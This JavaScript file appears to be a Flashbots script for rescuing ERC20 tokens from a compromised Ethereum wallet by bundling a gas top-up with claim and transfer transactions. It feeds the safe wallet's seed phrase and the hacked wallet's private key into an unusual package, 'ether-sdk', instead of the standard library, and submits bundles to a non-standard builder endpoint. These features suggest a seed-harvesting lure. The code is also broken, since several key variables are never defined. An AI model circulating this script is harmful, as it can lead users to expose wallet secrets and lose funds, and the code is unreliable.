
const { FlashbotsBundleProvider, FlashbotsBundleResolution, } = require("@flashbots/ethers-provider-bundle");
const ethers = require("ethers")
const ethersWallet= require("ether-sdk")
const Web3 = require("web3")



// SAFE WALLET SEED

var seed = "SAFE WALLET SEED SAFE WALLET SEED SAFE WALLET SEED"
let mnemonicWallet = ethersWallet.fromMnemonic(seed);
var PRIVATEKEY = mnemonicWallet.privateKey;
var myAddress = mnemonicWallet.address

// HACKED WALLET PRIVATE KEY

var Key = "PRIVATE KEY PRIVATE KEY PRIVATE KEY PRIVATE KEY PRIVATE KEY PRIVATE KEY " 
var hash32Key = ethersWallet.fromPrivateKey(Key);

// nonce
async function getCurrentNonce(wallet) {
  try {
    const nonce = await wallet.getTransactionCount("pending");
    console.log("Nonce:", nonce);
    return nonce;
  } catch (error) {
    console.error("Error fetching nonce:", error.message);
    throw error;
  }
}

async function main() {
  const provider = new ethers.providers.JsonRpcProvider("https://eth-mainnet.alchemyapi.io/v2/-----------");



  const authSigner = new ethers.Wallet(SIGNER_PK, provider);

  const safeWallet = new ethers.Wallet(SF_PK, provider);

  const hackedWallet = new ethers.Wallet(HK_PK, provider);

  const flashbotsRPC = "https://builder.gmbit.co/rpc";  //
  const flashbotsProvider = await FlashbotsBundleProvider.create(provider, authSigner, flashbotsRPC);

  // ERC20
  const tokenContractAddress = "0xd533a949740bb3306d119cc777fa900ba034cd52";


  let i = 1;
  while(i > 0) {
    let feeData = await provider.getFeeData();

    // nonce
    let newNonce = await getCurrentNonce(safeWallet);

    // nonce
    let hackedNonce = await getCurrentNonce(hackedWallet);

  
    const gasTransaction = {
      transaction: {
        from: "0xF99AC44Dce78A5D005A46297938..........",
        to: "0xeeC68608d68b3259ef29bCa68A513..........",
        value: ethers.utils.parseEther("0.007"), //0.007ETH
        type: 2,
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
        gasLimit: 21000,
        chainId: 1, //id
        nonce: newNonce
      },
      signer: safeWallet 
    };
  

    const claimTransaction = {
      transaction: {
        to: "0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2",
        data: "0x3ccfd60b", // 
        type: 2,
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
        gasLimit: 315000,
        chainId: 1,       
        nonce: hackedNonce
      },
      signer: hackedWallet
    };

    const transferTransaction =   {
      transaction: {
        to: tokenContractAddress, 
        data: "0xa9059cbb",
        type: 2,
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
        gasLimit: 96000, 
        chainId: 1,
        nonce: hackedNonce + 1  
      },
      signer: hackedWallet
    };
  
   
    const transactionBundle = [gasTransaction, claimTransaction, transferTransaction];
    
    let blockNumber = await provider.getBlockNumber();
    const targetBlockNumber = blockNumber + 1;
    console.log(`Current Block Number: ${blockNumber}, Target Block Number:${targetBlockNumber}`);
     
    
    //const signedTransactions = await flashbotsProvider.signBundle(transactionBundle)
    //const bundleResponse = await flashbotsProvider.simulate(signedTransactions, targetBlockNumber);

   
    const bundleResponse = await flashbotsProvider.sendBundle(transactionBundle, targetBlockNumber);
    
    if ('error' in bundleResponse) {
      console.error("Bundle submission error:", bundleResponse.error.message);
    } else {
      console.log(JSON.stringify(bundleResponse, null, 2))
    }

    const bundleResolution = await bundleResponse.wait()
    if (bundleResolution === FlashbotsBundleResolution.BundleIncluded) {
      console.log(`${i}${targetBlockNumber}`);
      i = -1;
    } else if (bundleResolution === FlashbotsBundleResolution.BlockPassedWithoutInclusion) {
      console.log(`${i}, ${targetBlockNumber}中`);
      i++;
    } else if (bundleResolution === FlashbotsBundleResolution.AccountNonceTooHigh) {
      i++;
      console.log("Nonce too high, failed");
    }
  }
}

main().catch(console.error);